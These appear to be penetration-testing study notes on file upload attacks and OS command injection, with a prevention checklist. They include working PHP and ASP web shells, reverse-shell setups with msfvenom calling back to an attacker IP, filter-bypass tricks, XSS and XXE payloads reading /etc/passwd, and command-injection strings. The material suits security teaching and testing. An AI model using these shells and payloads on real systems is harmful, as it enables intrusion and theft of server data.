Web Applications/Module 21

File Upload Attacks

Overview

File upload functionality is one of the most commonly exploited attack surfaces in web applications. When an application allows users to upload files without properly validating what those files contain, an attacker can upload malicious scripts (web shells, reverse shells) and potentially gain Remote Code Execution (RCE) on the server.

⚠️ File upload vulnerabilities are consistently ranked High or Critical in CVE reports.

Why they happen:
- Weak or missing file validation
- Relying only on front-end (client-side) checks
- Trusting user-supplied file names or Content-Type headers
- Outdated libraries with known vulnerabilities

Types of File Upload Attacks

Attack Type What It Does
Arbitrary File Upload No validation — upload anything, gain RCE
Client-Side Bypass Front-end validates only; bypass via Burp or DevTools
Blacklist Bypass Blacklist misses some PHP-executable extensions
Whitelist Bypass Double extension, reverse double, character injection
Content-Type Bypass Change MIME header to trick the server
Magic Bytes (MIME) Bypass Prepend image file signature to script
XSS via Upload Inject JS into SVG/HTML/image metadata
XXE via Upload Inject XML entities via SVG/PDF to read server files
DoS via Upload Zip bombs, pixel flood attacks, oversized files
Command Injection in Filename Filename executed as OS command

Tools Used in This Module

🔧 Burp Suite

What it is: A web proxy and security testing platform. It intercepts HTTP/S traffic between your browser and the target server, letting you inspect, modify, and replay requests.

Key features used here:
- Proxy — Intercept upload requests to modify filename, content, Content-Type
- Intruder — Fuzz file extensions/Content-Type headers with wordlists
- Repeater — Manually replay and tweak a single request

Why we use it: The browser enforces client-side validation (e.g., only allow .jpg). Burp lets us modify the raw HTTP request after the browser sends it, bypassing those front-end checks entirely.

🔧 Wappalyzer

What it is: A browser extension (available for Chrome and Firefox) that fingerprints the technology stack of any website.

Why we use it: Before uploading a web shell, we need to know what server-side language the app runs (PHP, ASP.NET, Node.js, etc.) because a web shell must be written in the same language as the server. Wappalyzer tells us the language, web server version, OS, and JavaScript libraries in one click.

Link: https://www.wappalyzer.com/

🔧 msfvenom

What it is: Part of the Metasploit Framework. A payload generator that can produce reverse shell scripts in many languages.

Why we use it: Manually written reverse shells may fail due to firewalls or function restrictions. msfvenom generates reliable payloads and can attempt to bypass some restrictions automatically.

🔧 netcat (nc)

What it is: A lightweight networking utility that can open TCP/UDP connections. Used here as a listener to catch incoming reverse shell connections.

Why we use it: After uploading a reverse shell script and visiting it, the server will connect back to our nc listener, giving us an interactive shell.

🔧 phpbash

What it is: A semi-interactive PHP web shell that looks like a terminal in your browser.

Link: https://github.com/Arrexel/phpbash

🔧 SecLists

What it is: A massive collection of wordlists for security testing — including web shell scripts, file extensions, Content-Type values, and more.

Relevant paths:
- /opt/useful/seclists/Web-Shells/ — Pre-built web shells for various languages
- PHP extensions wordlist — For fuzzing blacklist bypasses
- Content-Type wordlist — For fuzzing MIME type filters

Link: https://github.com/danielmiessler/SecLists

🔧 exiftool

What it is: A command-line tool for reading and writing metadata embedded in files (JPEG, PNG, PDF, etc.).

Why we use it: We can inject XSS payloads into image metadata fields (like Comment) so that when the app displays the metadata, our JavaScript executes.

Absent Validation — No Filters

This is the simplest and most dangerous case. The application accepts any file type with no restrictions on the front-end or back-end.

How to identify it:
- The file selector dialog shows "All Files" — no specific types restricted
- You can drag and drop a .php file and it appears in the upload box without error
- No mention of allowed file types anywhere in the UI

What to do: Upload a PHP web shell directly. The server will execute it as PHP code.

Identifying the Web Framework

Before uploading a shell, you must know what language the server runs. A PHP shell won't work on a Node.js server.

Method 1 — Check the URL Extension

Visit /index.php, /index.asp, /index.aspx etc. and see which one loads the app.

http://TARGET_IP:PORT/index.php   → PHP app
http://TARGET_IP:PORT/index.asp   → Classic ASP
http://TARGET_IP:PORT/index.aspx  → ASP.NET

Why this works: Most servers serve index.<ext> as the homepage. If visiting index.php returns the app, it's PHP.

Limitation: Apps using URL routing (e.g., Laravel, Django, Rails) may not expose the extension.

Method 2 — Wappalyzer Extension

Click the Wappalyzer icon in your browser after visiting the target. It will show:
- Programming language + version (e.g., PHP 7.4)
- Web server (e.g., Apache 2.4.41)
- OS (e.g., Ubuntu)
- JS libraries (e.g., jQuery 2.1.3)

Method 3 — Burp/ZAP Scanners

Run an automated scan against the target. Scanner headers and responses often leak framework info (e.g., X-Powered-By: PHP/7.4).

Vulnerability Identification

Once you know the language, test if the server actually executes uploaded scripts.

Step 1 — Create a test file:

<?php echo "Hello HTB"; ?>

Save it as test.php.

Step 2 — Upload it through the file upload form.

Step 3 — Visit the uploaded file. If the page prints Hello HTB → the server is executing PHP. If it prints the raw source code → PHP execution is disabled.

What this tells us: Successful PHP execution confirms we can upload a real web shell next.

Web Shells

A web shell is a script that runs on the server and lets you execute OS commands through the browser.

⚠️ The web shell must be written in the same language as the server. PHP shell on a PHP server, ASP shell on an ASP server.

Using phpbash (PHP)

phpbash gives you a terminal-like interface in the browser. Upload phpbash.php and visit it — you get an interactive shell running as the web server user (e.g., www-data).

Link: https://github.com/Arrexel/phpbash

Using SecLists Web Shells

Pre-built shells for many frameworks:

/opt/useful/seclists/Web-Shells/

Browse the folder for shells matching your target language, upload, and visit.

Writing a Custom Web Shell

Sometimes you don't have access to online resources during a pentest. Write a minimal shell from scratch.

PHP Web Shell

<?php system($_REQUEST['cmd']); ?>

Command breakdown:
- system() — PHP function that executes an OS command and prints the output
- $_REQUEST['cmd'] — Reads the cmd parameter from GET or POST data
- The ?> closes the PHP block

How to use after uploading:

http://TARGET_IP/uploads/shell.php?cmd=id

This runs id on the server and prints:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

💡 Tip: If reading output in a browser, press CTRL+U to view page source — this shows command output without HTML rendering mangling it.

Other commands to try:

?cmd=whoami          # Who is running the web server
?cmd=id              # User ID and groups
?cmd=hostname        # Server hostname
?cmd=cat /etc/passwd # List system users
?cmd=ls /var/www/html # List web root

ASP.NET Web Shell

<% eval request('cmd') %>

Command breakdown:
- eval — Executes the expression as code
- request('cmd') — Reads the cmd parameter from the HTTP request

How to use:

http://TARGET_IP/uploads/shell.aspx?cmd=whoami

PHP File Read (No Command Execution Needed)

<?php echo file_get_contents('/etc/passwd'); ?>

Why use this: If system() is disabled by the server config but file read functions aren't, you can still read sensitive files like /etc/passwd, web app config files, source code, etc.

Reverse Shells

A reverse shell makes the server connect back to you, giving you an interactive shell session. More powerful and interactive than a web shell.

Why it's preferred: You get a full TTY-like shell rather than a one-command-at-a-time interface.

When it might fail: Outbound firewall rules on the server block the connection back to you.

Using pentestmonkey PHP Reverse Shell

Link: https://github.com/pentestmonkey/php-reverse-shell

Steps:

  1. Download the script
  2. Open it in a text editor and modify lines 49-50:
$ip = '10.10.14.X';   // Your attacking machine IP (tun0/VPN IP)
$port = 4444;          // The port you'll listen on
  1. Start a netcat listener on your machine:
nc -lvnp 4444

Command breakdown:
- nc — netcat
- -l — Listen mode (wait for incoming connection)
- -v — Verbose output
- -n — No DNS resolution (faster)
- -p 4444 — Listen on port 4444

  1. Upload the script and visit its URL

  2. Your listener catches the connection:

connect to [10.10.14.X] from (UNKNOWN) [TARGET_IP] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

What to do with the shell:
- Enumerate the system: uname -a, cat /etc/os-release, ps aux
- Look for sensitive files: config files, credentials, SSH keys
- Escalate privileges if running as low-privilege user

Generating Reverse Shells with msfvenom

When manual reverse shells fail, use msfvenom to generate a more robust payload.

msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php

Command breakdown:
- msfvenom — Metasploit payload generator
- -p php/reverse_php — Use the PHP reverse shell payload
- LHOST=OUR_IP — Your attacking machine IP (the server will connect to this)
- LPORT=OUR_PORT — Port on your machine to listen on
- -f raw — Output as raw code (no encoding wrappers)
- > reverse.php — Save output to reverse.php

Then start your listener and upload:

nc -lvnp OUR_PORT

Other useful payloads:

msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php
msfvenom -p asp/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp

Client-Side Validation Bypass

Some apps only validate file types in JavaScript (front-end). The server accepts whatever is sent — the browser just warns you first.

How to identify it:
- You get an error like "Only images are allowed!" without the page refreshing
- No HTTP request is sent when you select a bad file (check Burp — nothing shows up)
- The upload button gets disabled by JavaScript

Two ways to bypass:

  1. Modify the HTTP request in Burp (change file content + filename after the browser validates)
  2. Disable the JavaScript validation in DevTools

Back-end Request Modification (Burp)

🎯 Goal Upload a PHP web shell even though the front-end only accepts images.

Steps:

  1. Select a real image file and click Upload — let it succeed normally
  2. In Burp Proxy, find the captured upload request
  3. Right-click → Send to Repeater
  4. In the Repeater tab, change two things:
    - filename="image.png" → filename="shell.php"
    - Replace the image binary content with your PHP web shell code:
    php <?php system($_REQUEST['cmd']); ?>
  5. Click Send

What you're looking for in the response:

File successfully uploaded

This means the back-end has no validation — it trusted the front-end to filter. The shell is now on the server.

📝 Note: You can also try changing Content-Type: image/png to Content-Type: application/x-php but it's often not necessary at this stage.

Disabling Front-end Validation (Dev Tools)

An alternative to Burp — directly edit the page's JavaScript.

Steps (Firefox):

  1. Press CTRL+SHIFT+C — Opens the Page Inspector (element picker)
  2. Click on the file upload input element
  3. In the HTML, find the <input> tag — it will look like:
    html <input type="file" name="uploadFile" id="ch21-uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
  4. Double-click on checkFile in the onchange attribute and delete the function name (leave onchange="" or remove the attribute entirely)
  5. You can also remove accept=".jpg,.jpeg,.png" to make file selection easier
  6. Now upload your PHP shell normally — no JavaScript is running to block it

Why this works: JavaScript runs in your browser, on your machine. You control it completely. The modification is temporary (lost on page refresh) but that's fine — we only need to bypass it once.

After uploading:
- Press CTRL+SHIFT+C again
- Click on the profile image area
- In the HTML you'll see: <img src="/profile_images/shell.php" ...> — that's your shell's URL

📝 Note: Chrome uses "Overrides" for persistent local changes. Firefox's DevTools edits are simpler for this purpose.

Blacklist Filters

The server has a list of banned extensions (e.g., .php, .php7, .phps) and rejects uploads that match.

How to identify it: You get "Extension not allowed" when trying to upload .php.

The weakness: Blacklists are never exhaustive. PHP can execute code through many less-known extensions.

Example of weak blacklist code (PHP):

$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}

Problems with this code:
- Only blocks 3 extensions — misses dozens of valid PHP-executing extensions
- Case-sensitive — pHp or PHP would bypass it on Windows servers
- Only checks the last extension — double extension attacks may work

Fuzzing Extensions with Burp Intruder

🎯 Goal Systematically test which extensions the blacklist misses.

Steps:

  1. Intercept an upload request in Burp → Right-click → Send to Intruder
  2. In the Positions tab: Clear all positions, then highlight the extension in filename="shell.php" — just the .php part — and click Add
  3. In the Payloads tab: Load the PHP extensions wordlist from PayloadsAllTheThings or SecLists
  4. Un-tick URL Encoding (otherwise . gets encoded to %2E)
  5. Click Start Attack

Analyze results:
- Sort by Length column
- Responses with the same length as "File successfully uploaded" → extension is allowed
- Responses with a different (shorter) length → extension is blocked

PHP extensions that commonly bypass blacklists:

.phtml
.pht
.phar
.php3
.php4
.php5
.php6
.phps
.pHp (case manipulation on Windows)

PayloadsAllTheThings PHP extensions list:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

ASP extensions list:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/extensions.lst

Web extensions list (SecLists):
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt

Using a Non-Blacklisted Extension

After fuzzing, pick an allowed extension like .phtml:

  1. In Intruder results, right-click the .phtml row → Send to Repeater
  2. In Repeater, set filename="shell.phtml" with PHP web shell content
  3. Send the request — you should get "File successfully uploaded"
  4. Visit /profile_images/shell.phtml?cmd=id to confirm execution

Whitelist Filters

More secure than blacklists — only allows a specific set of extensions (e.g., .jpg, .jpeg, .png, .gif).

How to identify it: All PHP variants (.phtml, .phar, etc.) are blocked. The error says "Only images are allowed."

Example whitelist code (PHP):

$fileName = basename($_FILES["uploadFile"]["name"]);
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}

The bug in this regex: It checks if the filename contains a whitelisted extension anywhere — not that it ends with one. So shell.jpg.php passes this check because the filename contains .jpg.

Double Extensions

Attack: Name the file so it contains a whitelisted extension AND ends with a PHP extension.

shell.jpg.php

Why it works against weak whitelists: The regex finds .jpg in the filename → passes validation. The server then interprets the file based on the last extension → executes as .php.

Steps:

  1. Intercept upload request in Burp
  2. Change filename="image.jpg" to filename="shell.jpg.php"
  3. Replace content with PHP web shell
  4. Send — visit the uploaded file at /profile_images/shell.jpg.php?cmd=id

Strict regex that stops this:

if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {

The $ anchors to the end of the string — so the filename must end with an allowed extension.

Reverse Double Extension

Attack: Use when the server's whitelist is strict (ends with), but the web server configuration allows PHP execution for files that merely contain a PHP extension.

Example vulnerable Apache config (/etc/apache2/mods-enabled/php7.4.conf):

<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>

The bug: This regex has no $ anchor — any file containing .php, .phtml, or .phar in its name will be executed as PHP.

Attack: Name your file:

shell.php.jpg
  • Whitelist check: filename ends with .jpg → passes
  • Apache config: filename contains .php → executes as PHP

Steps:

  1. Intercept upload in Burp
  2. Set filename="shell.php.jpg" with PHP web shell content
  3. Send and visit the file

Character Injection

Attack: Inject special characters between the real extension and a fake extension to trick the server into storing a PHP file while appearing to upload an image.

Characters to try:

Character Effect
%00 Null byte — PHP ≤ 5.x stops filename here, stores as .php
%20 URL-encoded space
%0a Newline
%0d0a Carriage return + newline
/ Directory separator
.\ Windows path
. Trailing dot
… Ellipsis
: Windows NTFS alternate data stream (ADS)

Example — Null byte attack (PHP ≤ 5.x):

shell.php%00.jpg

The PHP server reads the filename up to %00 and stores it as shell.php, while the whitelist regex sees .jpg at the end and passes.

Example — Windows colon trick:

shell.aspx:.jpg

Windows writes the file as shell.aspx (the colon starts an ADS), bypassing the whitelist.

Generate a fuzzing wordlist for character injection:

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

Command breakdown:
- Outer loop iterates over injection characters
- Inner loop iterates over PHP extensions to inject
- Four combinations per pair: character before extension, after extension, before at end, after at end
- All variations saved to wordlist.txt for use in Burp Intruder

Load this into Burp Intruder the same way as the extension fuzzing above.

Type Filters — Content-Type Bypass

Some apps ignore the filename extension entirely and check the Content-Type header sent in the upload request. Browsers set this automatically based on the file, but it's easy to change.

Example validation code (PHP):

$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}

What $_FILES['uploadFile']['type'] actually contains: The Content-Type header from the multipart form data — exactly what the client sent. It's trivially spoofable.

How to identify this filter: Even changing the filename doesn't change the error. The app is reading Content-Type, not the extension.

Bypass Steps:

  1. Intercept the upload request in Burp
  2. In the multipart body, find the line: Content-Type: application/x-php
  3. Change it to: Content-Type: image/jpeg
  4. Keep filename="shell.php" and PHP web shell content
  5. Send → "File successfully uploaded"

Fuzzing allowed Content-Types:

wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/Web/content-type.txt
cat content-type.txt | grep 'image/' > image-content-types.txt

Command breakdown:
- wget — downloads the Content-Type wordlist
- grep 'image/' — filters to only image/* types (since the error said "Only images are allowed" we know the whitelist is image types)
- Saves filtered list to image-content-types.txt

Load image-content-types.txt into Burp Intruder (position on the Content-Type value) to find exactly which types are allowed.

📝 Note: Upload requests have two Content-Type headers — one for the whole request (multipart/form-data) and one inside the body for the file part. Modify the one in the body.

Content-Types reference:
https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt

MIME-Type Bypass (Magic Bytes)

More robust than Content-Type checking — the server reads the actual bytes at the start of the file to determine its type. This is called the file signature or magic bytes.

Common magic bytes:

File Type Magic Bytes (ASCII) Hex
GIF GIF87a or GIF89a 47 49 46 38
PNG ‰PNG 89 50 4E 47
JPEG ÿØÿ FF D8 FF
PDF %PDF 25 50 44 46
ZIP PK 50 4B 03 04

File Signatures reference:
https://en.wikipedia.org/wiki/List_of_file_signatures

Example MIME validation code (PHP):

$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}

What mime_content_type() does: Reads the first few bytes of the actual uploaded file and determines the type from its binary signature — not from the extension or Content-Type header.

Verify file MIME type on Linux:

echo "this is a text file" > text.jpg
file text.jpg
# Output: text.jpg: ASCII text

echo "GIF8" > text.jpg
file text.jpg
# Output: text.jpg: GIF image data

Command breakdown:
- echo "GIF8" > text.jpg — Writes the GIF magic bytes to a file with a .jpg extension
- file text.jpg — The file command reads magic bytes and reports the actual MIME type, ignoring extension
- The output changes to "GIF image data" proving the MIME type is now read as a GIF

Bypass Steps:

  1. In Burp Repeater (or directly in your shell file), add GIF8 as the very first line:
GIF8
<?php system($_REQUEST['cmd']); ?>
  1. Keep filename="shell.php" so the server executes it as PHP
  2. Change Content-Type: image/jpeg in the header too (combine both bypasses)
  3. Send → "File successfully uploaded"
  4. Visit the file — output will start with GIF8 followed by the command output:
GIF8uid=33(www-data) gid=33(www-data) groups=33(www-data)

💡 Why GIF? GIF magic bytes (GIF8) are ASCII-printable characters — easy to prepend to a text file. PNG and JPEG magic bytes contain non-printable bytes that are harder to inject in text-based requests.

Limited File Uploads — XSS via Upload

Even when you cannot achieve RCE, certain file types can be used for other attacks.

XSS via HTML Upload

If the app allows .html uploads, you can inject JavaScript:

<script>alert(window.origin);</script>

When a user visits the uploaded HTML file, the JS executes in their browser in the context of the application's origin.

XSS via Image Metadata (exiftool)

If the app displays image metadata after upload, inject an XSS payload into a metadata field:

exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' HTB.jpg

Command breakdown:
- exiftool — reads/writes file metadata
- -Comment='...' — sets the Comment metadata field to our XSS payload
- "><img src=1 onerror=alert(window.origin)> — breaks out of any existing attribute context and injects an image tag that fires JS on error
- HTB.jpg — the target image file

Verify the payload was written:

exiftool HTB.jpg
# ...
# Comment : "><img src=1 onerror=alert(window.origin)>

When the app renders the metadata comment in HTML without sanitization → XSS fires.

XSS via SVG Upload

SVG files are XML-based — you can embed JavaScript directly:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>

Save as HTB.svg and upload. When the SVG is rendered in the browser, the <script> tag executes.

File types that allow XSS: HTML, JS, SVG, GIF (metadata)

Limited File Uploads — XXE via Upload

XXE (XML External Entity) attacks let you read files from the server's filesystem.

XXE via SVG — Read /etc/passwd

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

How it works:
- <!ENTITY xxe SYSTEM "file:///etc/passwd"> — Declares an external entity pointing to /etc/passwd
- &xxe; — Inserts the entity value (contents of /etc/passwd) into the SVG output
- When the server renders/processes the SVG, it fetches and inlines the file content

XXE via SVG — Read PHP Source Code

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>

How it works:
- php://filter/convert.base64-encode/resource=index.php — PHP stream wrapper that base64-encodes the file before returning it (prevents binary data issues)
- The page displays base64-encoded source code of index.php
- Decode it: echo "BASE64STRING" | base64 -d

What to look for in source code:
- Upload directory path
- Allowed file extensions
- File naming scheme
- Database credentials
- API keys

File types that allow XXE: XML, SVG, PDF, PowerPoint (.pptx), Word (.docx)

Reference: https://portswigger.net/web-security/xxe

DoS via File Upload

Zip Bomb (Decompression Bomb)

If the app automatically extracts ZIP archives, upload a nested ZIP that decompresses to petabytes of data:

  • Create ZIP inside ZIP inside ZIP... many levels deep
  • Each level multiplies the decompressed size
  • Server runs out of memory/disk while extracting → crash

Pixel Flood Attack (JPG/PNG)

Create an image with valid headers claiming a massive size (e.g., 0xffff x 0xffff = ~4 gigapixels):

  • Server attempts to allocate memory for a 4-gigapixel image
  • Server runs out of RAM → crash

Oversized File Upload

If no file size limit exists, upload a multi-GB file:

  • Fills the server's hard drive
  • Server crashes or becomes unresponsive

Directory Traversal in Filename

If the app is vulnerable to path traversal, try uploading with a filename like:

../../../etc/cron.d/shell

Writing to system directories can cause unexpected crashes or behavior.

DoS-capable file types: ZIP, JPG, PNG

Other Upload Attacks

Command Injection via Filename

If the app passes the filename to an OS command (e.g., to move the file), inject commands:

file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami

How it works: If the server does something like mv $filename /var/uploads/, the injected command runs as part of the shell command.

Reference: HTB Command Injections module

XSS via Filename

<script>alert(window.origin);</script>.jpg

If the filename is displayed in the UI without sanitization, the script executes.

SQL Injection via Filename

file';select+sleep(5);--.jpg

If the filename is inserted into a SQL query without parameterization.

Upload Directory Disclosure

Force an error to reveal the path:

  1. Upload a file with a name that already exists → server may error: "Cannot write to /var/www/html/uploads/shell.php"
  2. Upload a file with an extremely long name (5000 chars) → server error may include the path
  3. Send two identical upload requests simultaneously → race condition error

Other methods:
- LFI/XXE to read web app source code and find the uploads path
- IDOR enumeration on file URLs

Windows-Specific Attacks

Technique Description
Reserved characters \| < > * ? May cause errors revealing the uploads path
Reserved names CON COM1 LPT1 NUL Server cannot create files with these names → error disclosure
Windows 8.3 short names HAC~1.TXT refers to hackthebox.txt — can overwrite files

Preventing File Upload Vulnerabilities

Use this as a checklist when reporting findings to developers.

1. Extension Validation — Use Both Blacklist AND Whitelist

$fileName = basename($_FILES["uploadFile"]["name"]);

// Blacklist — reject dangerous extensions anywhere in filename
if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// Whitelist — filename must END with an allowed extension
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

Why both? Blacklist catches shell.php even if the whitelist regex is weak. Whitelist prevents unknown dangerous extensions from sneaking through.

2. Content Validation — Validate Extension + Content-Type + MIME

$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// Whitelist — must end with .png
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// Validate both Content-Type header AND actual file MIME type
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only PNG images are allowed";
        die();
    }
}

Why check both? Content-Type header is user-controlled (easy to spoof). MIME type from magic bytes is harder to fake but not impossible (prepending GIF8 works). Checking both raises the bar.

3. Hide the Upload Directory

  • Don't expose the uploads directory URL directly
  • Use a download.php script that serves files:
  • Validates the user owns the file (prevents IDOR/LFI)
  • Returns 403 Forbidden for direct path access
  • Sets Content-Disposition: attachment header (forces download, prevents execution)
  • Sets nosniff header: X-Content-Type-Options: nosniff

4. Randomize Uploaded Filenames

  • Don't store files with user-supplied names
  • Generate a random UUID or hash for the filename
  • Store the original (sanitized) name in the database
  • Prevents: filename injection attacks, overwriting existing files, directory disclosure via predictable names

5. Store Uploads on a Separate Server

  • If RCE is achieved, attacker only compromises the upload server, not the main app server
  • Use open_basedir in PHP to restrict file access to the upload directory only

6. Disable Dangerous PHP Functions

In php.ini:

disable_functions = exec,shell_exec,system,passthru,popen,proc_open,pcntl_exec

Even if a shell is uploaded, these functions won't be callable.

7. Additional Security Measures

  • Limit file size — reject files above a maximum size
  • Keep libraries updated — outdated image processing libraries have known RCE exploits (e.g., ImageMagick "ImageTragick")
  • Scan uploads for malware — use ClamAV or similar on the upload directory
  • WAF — Web Application Firewall as a secondary layer
  • Don't display raw errors — handle errors at app level, log details server-side only

Web Applications/Module 22

Command Injections

What Are Injections

OWASP Top 10 Risk #3 — Injection vulnerabilities are among the most impactful and common web application issues.

Core Concept:
Injection occurs when user-controlled input is misinterpreted as part of the web query or code being executed. The attacker escapes the intended input boundary and manipulates the query to produce a different outcome.

Common Injection Types

Injection Type What Happens
OS Command Injection User input is directly passed into a shell command
Code Injection User input lands inside an eval()-type function
SQL Injection User input becomes part of a SQL query
XSS / HTML Injection User input is reflected directly on the page
LDAP Injection Input manipulates LDAP directory queries
NoSQL Injection Input manipulates NoSQL database queries
HTTP Header Injection Input is placed into HTTP response headers
XPath Injection Input manipulates XPath queries on XML data
IMAP Injection Input targets IMAP mail protocol commands
ORM Injection Input manipulates Object Relational Mapper queries

Key Takeaway: As new web technologies emerge, new injection types appear. The common thread is always unsanitized user input making it into a query or execution context.

OS Command Injections

When user input directly or indirectly reaches a function that executes operating system commands, we may be able to inject arbitrary shell commands.

Vulnerable PHP Functions

Function Description
exec() Executes a command, returns last line of output
system() Executes command and outputs directly
shell_exec() Executes via shell, returns full output as string
passthru() Executes command and passes raw output to browser
popen() Opens a pipe to/from a process

PHP Vulnerable Code Example

<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>

Why this is vulnerable:
The $_GET['filename'] value comes directly from the URL query string and is concatenated into a shell command without any sanitization. An attacker can pass filename=test; whoami to inject an extra command.

🔍 What to look for
Any place where user-controlled input flows into exec, system, shell_exec, passthru, or popen.

NodeJS Vulnerable Code Example

app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})

Why this is vulnerable:
Same issue — req.query.filename is user-controlled and inserted directly into a shell command using template literals.

NodeJS dangerous functions:
- child_process.exec() — passes command to the shell (vulnerable to injection)
- child_process.spawn() — does NOT pass through a shell by default (safer, but still depends on usage)

Important: Command injection is not language-specific. PHP, NodeJS, Python, Java, Ruby — all can be vulnerable if user input reaches a shell execution function without sanitization.

Detection

Core Principle: The process of detecting basic OS Command Injections is essentially the same as exploiting them. You attempt to append a command — if the output changes from what's expected, you've found a vulnerability.

Step-by-Step Detection Workflow

1. Identify input fields that might reach a system command
2. Submit normal input → observe expected output
3. Append an injection operator + a test command (e.g., ; whoami)
4. If output changes or includes command output → VULNERABLE
5. If output is blocked → filters exist → begin bypass attempts

Example — Host Checker Application

The app takes an IP and runs ping:

ping -c 1 <USER_INPUT>

What tells us it's using ping:
The output shows ICMP statistics (packets transmitted, RTT, etc.) — this is ping's output format. We can infer the command structure even without source code access.

Test payload:

127.0.0.1; whoami

This would expand the executed command to:

ping -c 1 127.0.0.1; whoami

Command Injection Methods — Operators

These operators let you chain or inject a second command alongside the intended one.

Operator Character URL-Encoded Behavior
Semicolon ; %3b Runs both commands sequentially
New Line \n %0a Runs both commands (newline separator)
Background & %26 Runs both; second output shown first
Pipe \| %7c Runs both; only second output shown
AND && %26%26 Runs second only if first succeeds (exit code 0)
OR \|\| %7c%7c Runs second only if first fails (exit code 1)
Sub-Shell `` %60%60 Both execute — Linux/macOS only
Sub-Shell $() %24%28%29 Both execute — Linux/macOS only

Operator Behavior Deep Dive

Semicolon ;

ping -c 1 127.0.0.1; whoami
# RESULT: ping output + whoami output
# Works on Linux & Windows PowerShell, NOT Windows CMD

AND &&

ping -c 1 127.0.0.1 && whoami
# RESULT: Both run — but only if ping succeeds (returns exit 0)
# If you omit the IP: && whoami → ping fails → whoami never runs

OR ||

ping -c 1 127.0.0.1 || whoami
# RESULT: ping succeeds → whoami NEVER runs (exit code 0 stops the chain)

|| whoami
# RESULT: ping fails (no destination) → whoami DOES run
# Useful when you want clean output with just your injected command

Pipe |

ping -c 1 127.0.0.1 | whoami
# RESULT: Only whoami output shown — ping's stdout is piped in but irrelevant
# Useful for clean output

Tip: For testing, start with ; or \n since they always run both commands. Use || when you want only your command's output (supply no valid first input).

Injection Operators Across All Injection Types

Injection Type Common Operators
SQL Injection ' , ; -- /* */
Command Injection ; &&
LDAP Injection * ( ) & ``
XPath Injection ' or and not substring concat count
OS Command Injection ; & ``
Code Injection ' ; -- /* */ $() ${} #{} %{} ^
Directory Traversal ../ ..\ %00
Object Injection ; & ``
XQuery Injection ' ; -- /* */
Shellcode Injection \x \u %u %n
Header Injection \n \r\n \t %0d %0a %09

Injecting Commands

Practical Injection Walkthrough

Scenario: Host Checker app — input goes into ping -c 1 <INPUT>

Step 1 — Test basic injection:

# Payload to enter in the field:
127.0.0.1; whoami

# Full command the server executes:
ping -c 1 127.0.0.1; whoami

Step 2 — Verify locally first:

ping -c 1 127.0.0.1; whoami
# Expected output: ping stats + your username
# This confirms the payload structure is correct before sending it

Step 3 — If front-end blocks it (input validation error):
→ The error appears without a network request → validation is happening client-side only
→ Use Burp Suite to bypass (see next section)

Bypassing Front-End Validation

Why front-end validation is insufficient:
Front-end JavaScript validation (like checking for IP format) can be trivially bypassed by sending HTTP requests directly to the back-end, skipping the browser entirely.

Tools for Bypassing Front-End Validation

Burp Suite

A web proxy that intercepts, modifies, and replays HTTP requests. The industry standard for web application penetration testing.

Steps:
1. Start Burp Suite
2. Configure Firefox to proxy through Burp (127.0.0.1:8080)
